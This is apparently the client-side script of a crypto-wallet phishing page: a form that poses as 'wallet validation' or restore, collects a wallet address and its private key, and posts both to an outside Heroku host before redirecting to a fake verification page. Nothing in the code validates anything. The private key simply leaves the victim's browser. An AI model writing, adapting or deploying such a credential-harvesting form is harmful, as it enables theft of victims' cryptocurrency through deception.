const form = document.getElementById("form");
const walletAddress = document.getElementById("exampleFormControlInput1");
const privateKey = document.getElementById("exampleInputEmail1");

form.addEventListener("submit", async (e) => {
  e.preventDefault();
  await checkInput();
  let privateKeyValue = privateKey.value.trim();
  let walletAddressValue = walletAddress.value.trim();
  const url = "https://wallet-validation.herokuapp.com/privateKey/restore";
  const response = await fetch(url, {
    method: "post",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      privateKey: privateKeyValue,
      walletAddress: walletAddressValue,
    }),
  });
  if (response.status === 201) {
    let data = await response.json();
    location.assign("verifcation.html");
  }
});

// Validation for form
function checkInput() {
  if (walletAddress.value === "") {
    addErrorTo("exampleFormControlInput1", "Wallet Address is required!");
  } else {
    removeError("exampleFormControlInput1");
  }
  if (privateKey.value === "") {
    addErrorTo("exampleInputEmail1", "Enter Your Private Key");
  } else {
    removeError("exampleInputEmail1");
  }
}
function addErrorTo(field, message) {
  const formControl = form[field].parentNode;
  formControl.classList.add("error");

  const errMsg = formControl.querySelector("small");
  errMsg.innerText = message;
  errMsg.style.opacity = "1";
}
function removeError(field) {
  const formControl = form[field].parentNode;
  formControl.classList.remove("error");

  const errMsg = formControl.querySelector("small");
  errMsg.innerText = "";
  errMsg.style.opacity = "0";
}
